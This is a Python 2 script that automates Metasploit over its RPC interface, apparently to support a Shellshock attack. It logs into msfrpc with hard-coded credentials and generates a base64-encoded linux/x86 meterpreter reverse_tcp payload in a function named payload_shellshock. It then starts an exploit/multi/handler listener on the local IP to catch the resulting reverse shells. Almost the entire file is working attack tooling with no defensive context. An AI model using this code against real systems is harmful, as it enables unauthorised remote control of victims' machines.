import msfrpc
import msgpack
from netifaces import interfaces, ifaddresses, AF_INET
import time

def get_current_IP():
  for ifaceName in interfaces():
    addresses = [i['addr'] for i in ifaddresses(ifaceName).setdefault(AF_INET, [{'addr':'No IP addr'}] )]
    #print '%s: %s' % (ifaceName, ', '.join(addresses))
  return addresses[0] 

def init_console(user='admin',password='miau',port='55552',host='127.0.0.1'):
  client = msfrpc.Msfrpc({'port':port,'host':host})
  auth =client.login(user,password)
  if auth:
    console=client.call('console.create',[])
    return client,console
  else:
    print "Error"
    
def print_console(client,console):
  while True:
   readedData=client.call('console.read',[console['id']])   
   if len(readedData['data'])>1:
      #readedData=readedData['data']
      print readedData['data']      
   if readedData['busy']==True:
        print readedData['data']        
        time.sleep(1)
        continue
   break      
        
def payload_shellshock(client,console,LPORT='4444',LHOST='192.168.1.1'):
    print_console(client,console)
    cmd='msfpayload linux/x86/meterpreter/reverse_tcp lhost='+str(LHOST)+' lport='+LPORT+' X > p1.bin && chmod 755 p1.bin && cat p1.bin | base64'
    client.call('console.write',[console['id'],cmd+'\n'])
    while True:
      readedData=client.call('console.read',[console['id']])
      if readedData['busy']==True:
        time.sleep(1)
        print readedData['data']   
        continue
      payload=readedData['data'][:-1]
    #client.call('console.destroy',[console['id']])
      return payload
    
def create_shellshock_payload(LPORT='4444',LHOST=None,user='admin',password='miau',port='55552',host='127.0.0.1'):
    if str(LHOST)=='None':
        LHOST=get_current_IP()
    client0,console0=init_console(user,password,port,host)
    payload=payload_shellshock(client0,console0,LPORT=LPORT,LHOST=LHOST)
    print "Payload succesfully generated: ",payload
    client0.call('console.destroy',[console0['id']])
    return payload

def meterpreter_handler(LPORT='4444',user='admin',password='miau',port='55552',host='127.0.0.1'):
    client0,console0=init_console(user,password,port,host)
    print_console(client0,console0)    
    cmd='use exploit/multi/handler'
    cmd2='set payload linux/x86/meterpreter/reverse_tcp'
    cmd3='set LHOST '+get_current_IP()
    cmd4='set LPORT '+LPORT
    cmd5='exploit'
    comands=[cmd,cmd2,cmd3,cmd4,cmd5]
    msf_comands(comands,client0,console0)
    return client0,console0

def msf_comands(comands,client,console):
  for cmd in comands:  
    client.call('console.write',[console['id'],cmd+'\n'])
    print cmd
    i=0
    while i<20:
      readedData=client.call('console.read',[console['id']]) 
      if readedData['busy']==True:
        time.sleep(1)
        i+=1
        print readedData['data'],i   
        continue         
      break  
            
def restore_console(client,console):    
    readedData=client.call('console.session_kill',[console['id']])    
    return init_console()

def read_console(client,console,n=5):
    for i in range(n):
     print client.call('console.read',[console['id']])['data'] 
        
def new_console(client):        
    try:
        return client.call('console.create',[])
    except:
        print "Error creando la nueva consola"
        